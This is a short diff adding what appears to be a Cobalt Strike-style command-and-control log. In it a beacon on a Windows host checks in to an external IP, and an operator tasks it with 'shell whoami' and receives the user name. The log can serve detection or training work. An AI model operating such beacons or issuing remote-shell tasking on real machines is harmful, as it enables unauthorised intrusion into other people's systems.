@@ -1,0 +1,9 @@
+09/06 08:20:07 UTC [metadata] 223.72.41.199 <- 192.168.1.15; computer: NOT-FOUND-404; user: kaeiy; process: artifact_x64.exe; pid: 19960; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+09/06 08:20:12 UTC [input] <neo> shell whoami
+09/06 08:20:12 UTC [task] <T1059> Tasked beacon to run: whoami
+09/06 08:21:07 UTC [checkin] host called home, sent: 37 bytes
+09/06 08:21:07 UTC [output]
+received output:
+not-found-404\kaeiy
+
+
